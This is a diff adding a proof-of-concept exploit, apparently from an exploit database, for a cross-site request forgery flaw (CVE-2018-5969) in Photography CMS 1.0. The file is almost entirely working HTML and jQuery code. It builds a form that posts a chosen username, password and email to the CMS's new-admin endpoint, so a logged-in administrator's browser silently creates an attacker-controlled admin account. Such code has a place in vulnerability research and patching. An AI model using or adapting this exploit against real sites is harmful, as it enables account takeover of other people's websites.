@@ -1,0 +1,58 @@
+<!--
+# # # # # 
+# Exploit Title: Photography CMS 1.0 - Cross-Site Request Forgery (Add Admin)
+# Dork: N/A
+# Date: 23.01.2018
+# Vendor Homepage: http://ronnieswietek.com/
+# Software Link: https://codecanyon.net/item/client-photo-studio-photography-cms/1191688
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-5969
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# 
+# Proof of Concept:
+# 1)
+-->
+<html>
+<body>
+<script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
+<h2>New Admin</h2>
+<div class="efe">
+<form method="post" onSubmit="return false">
+	<label for="username">Username:</label>
+	<input id="username" type="text"><br><br>
+
+	<label for="password1">Password:</label>
+	<input id="password1" type="password"><br><br>
+
+	<label for="password2">Confirm Password:</label>
+	<input id="password2" type="password"><br><br>
+
+	<label for="email">Email:</label>
+	<input id="email" type="text"><br><br>
+
+	<input id="ekleabi" value="Ver Ayari" type="submit">
+</form>
+</div>
+<script type="text/javascript">
+	$("#ekleabi").live('click',function()
+	{
+		$.ajax({
+			type: "POST",
+			url: "http://ronnieswietek.com/cc/clients/resources/ajax/ajax_new_admin.php",
+			data:{
+				username:$(".efe #username").val(),
+				password1:$(".efe #password1").val(),
+				password2:$(".efe #password2").val(),
+				email:$(".efe #email").val()
+			}
+		});
+	});
+</script>
+</body>
+</html>
